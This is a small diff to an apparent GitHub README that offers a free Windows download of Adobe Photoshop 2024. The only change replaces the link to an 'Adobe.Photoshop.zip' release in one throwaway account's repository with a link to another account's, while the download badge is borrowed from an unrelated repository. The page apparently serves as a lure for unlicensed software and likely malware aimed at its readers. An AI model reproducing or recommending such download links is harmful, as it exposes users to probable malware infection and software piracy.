@@ -5,4 +5,4 @@ Adobe Photoshop for MacOS and Windows
 
 | Downloads | For Windows |
 |:-------------:| :--------:|
-| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For Windows](https://github.com/yourfriend32/Adobe-Photoshop-2024/releases/download/release/Adobe.Photoshop.zip) |
+| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For Windows](https://github.com/sharpykkk/Adobe-Photoshop-2024/releases/download/DOWNLOAD/Adobe.Photoshop.zip) |
